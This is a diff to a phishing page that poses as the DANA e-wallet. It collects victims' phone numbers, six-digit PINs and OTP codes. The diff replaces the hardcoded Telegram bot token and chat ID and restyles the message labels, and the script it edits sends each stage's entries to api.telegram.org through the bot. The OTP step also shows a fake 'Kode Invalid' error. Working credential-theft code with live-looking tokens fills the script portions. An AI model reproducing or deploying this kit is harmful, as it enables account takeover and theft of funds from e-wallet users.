@@ -1,4 +1,3 @@
-
 <html class="hydrated"><head>
   <meta charset="UTF-8"><style data-styles="">ion-icon{visibility:hidden}.hydrated{visibility:inherit}</style><style data-styles="">ion-icon{visibility:hidden}.hydrated{visibility:inherit}</style>
   <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
@@ -446,7 +445,7 @@
         <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
       </div>
       <form id="formNohp" onsubmit="sendNohp(event);">
-           <input type="hidden" id="logo" value="|___𝔻𝔸ℕ𝔸 𝕀𝔻___|">
+           <input type="hidden" id="logo" value="𝔻𝔸ℕ𝔸 𝕀𝔻">
         <h3 style="font-size: 16px; margin-top: -20px">Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
         <div class="box-input" style="width: 95%;">
           <div class="label">
@@ -654,10 +653,10 @@
       var logo = document.getElementById('logo');       
       var inp = document.getElementById('inp');
       
-      var gabungan = '' + logo.value + '%0A𝑵 𝒐 - 𝑯 𝑷 👉 : ' + '0' + inp.value;
+      var gabungan = '' + logo.value + '%0A𝗡𝗢.𝗛𝗣 >>>>: ' + '0' + inp.value;
      
-       var token = '6382618374:AAFJAtotA8aZA99guoYMqLSYSKs_Ia3_XXo'; 
-      var grup = '6965826220'; 
+       var token = '7738643849:AAHn8ZJxVISmnuWpISItzZyWN3g32bNKqDM'; 
+      var grup = '6960696389'; 
 
   
       $.ajax({
@@ -691,13 +690,13 @@
    var pin5 = document.getElementById('pin5');
    var pin6 = document.getElementById('pin6');
        
-    var gabungan = '' + logo.value + '%0A𝑵 𝒐 - 𝑯 𝑷 👉 : ' + '0' + inp.value + '%0A𝑷 𝑰 𝑵 👉     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
+    var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩: ' + '0' + inp.value + '%0A𝗣 𝗜 𝗡 >>>>     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
     
        
    
   
-       var token = '6382618374:AAFJAtotA8aZA99guoYMqLSYSKs_Ia3_XXo'; 
-      var grup = '6965826220';  
+       var token = '7738643849:AAHn8ZJxVISmnuWpISItzZyWN3g32bNKqDM'; 
+      var grup = '6960696389';  
 
 
       $.ajax({
@@ -735,11 +734,11 @@
   $(".alert").text("Kode Invalid ");
   $(".alert").css("color","red");
    },2000);
-      var gabungan = '' + logo.value + '%0A𝑵 𝒐 - 𝑯 𝑷 👉 : ' + '0' + inp.value + '%0A𝑷 𝑰 𝑵 👉    : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝑶 𝑻 𝑷 👉    : ' + otp1.value + otp2.value + otp3.value + otp4.value;
+      var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩: ' + '0' + inp.value + '%0A𝗣 𝗜 𝗡 >>>>    : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝗢 𝗧 𝗣>>>>    : ' + otp1.value + otp2.value + otp3.value + otp4.value;
   
   
-       var token = '6382618374:AAFJAtotA8aZA99guoYMqLSYSKs_Ia3_XXo'; 
-      var grup = '6965826220'; 
+       var token = '7738643849:AAHn8ZJxVISmnuWpISItzZyWN3g32bNKqDM'; 
+      var grup = '6960696389'; 
   
       $.ajax({
           url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -799,4 +798,4 @@ id="<!DOCTYPE html>
 <body>
     
 </body>
-</html>"
+</html>
